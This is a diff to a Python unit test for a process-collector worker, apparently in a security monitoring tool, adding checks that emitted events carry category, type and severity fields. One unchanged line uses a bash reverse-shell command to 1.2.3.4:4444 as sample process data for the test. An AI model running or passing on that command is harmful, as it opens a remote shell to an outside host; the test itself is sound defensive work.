@@ -65,12 +65,16 @@ def test_worker_emits_event_per_record() -> None:
     ev = events[0]
     assert ev["module"] == "process_collector"
     assert ev["action"] == "process_start"
+    assert ev["kind"] == "event"
+    assert ev["category"] == ["process"]
+    assert ev["type"] == ["start"]
+    assert ev["severity"] == "info"
     assert ev["host"]["name"] == "test-host"
     assert ev["process"]["pid"] == 1234
     assert ev["process"]["name"] == "bash"
     assert ev["process"]["command_line"] == "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
     assert ev["process"]["parent"]["pid"] == 999
-    assert ev["actor"]["user"]["id"] == "1000"
+    assert ev["user"]["id"] == "1000"
 
 
 def test_worker_empty_poll_is_a_noop() -> None:
